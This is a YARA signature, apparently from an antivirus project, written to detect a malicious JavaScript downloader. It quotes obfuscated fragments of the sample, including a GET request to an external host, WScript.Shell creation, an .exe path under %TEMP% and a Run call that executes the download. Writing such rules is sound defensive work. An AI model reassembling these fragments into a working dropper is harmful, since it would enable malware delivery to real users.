rule sig_20160330_165250046e4725b1f8a941e81c3e4e16 {
  meta:
    description = "datamaliciousorder - file 20160330_165250046e4725b1f8a941e81c3e4e16.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "94bb6023fed1cb939acf95cef7df263aa056061d79116adfd60958860a382f7d"

  strings:
    $s1  = "_F0[_HC](\"GET\", \"http://rocketsrange.com/b5ksa\", false);" fullword ascii
    $s2  = "var _M = function _H() {return WScript[_K1](\"WScript\"+\".Shell\");}(), _KG = 11;" fullword ascii
    $s3  = "function _T(_JE, _PY){_L = _L * 1; return _JE - _PY;};" fullword ascii
    $s4  = "if (_F0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _EO(){return _OA + \"\";};" fullword ascii
    $s6  = "function _K() {return _M[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"LBZz2v2R9fG.ex\" + \"e\";};" fullword ascii
    $s7  = "function _E0(_F){_M[\"Run\"](_F, _L, _L);};" fullword ascii
    $s8  = "function _E() {return ((_G == true) && (_G == _NY)) ? 1 : _L;};" fullword ascii
    $s9  = "function _YA(_XO) {var _KV = (1, 2, 3, 4, 5, _XO); return _KV;};" fullword ascii
    $s10 = "return _T(_QZ, _MT);" fullword ascii
    $s11 = "function _K0(){return 22;};" fullword ascii
    $s12 = " while (_E1){" fullword ascii
    $s13 = "var _WA = new this[\"Date\"]();" fullword ascii
    $s14 = "function _RE(){return _K1;};" fullword ascii
    $s15 = "function _QN()" fullword ascii
    $s16 = "var _G = false;" fullword ascii
    $s17 = "_NY = true; " fullword ascii
    $s18 = "var _NY = false;" fullword ascii
    $s19 = "var _D = false;" fullword ascii
    $s20 = "_G = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}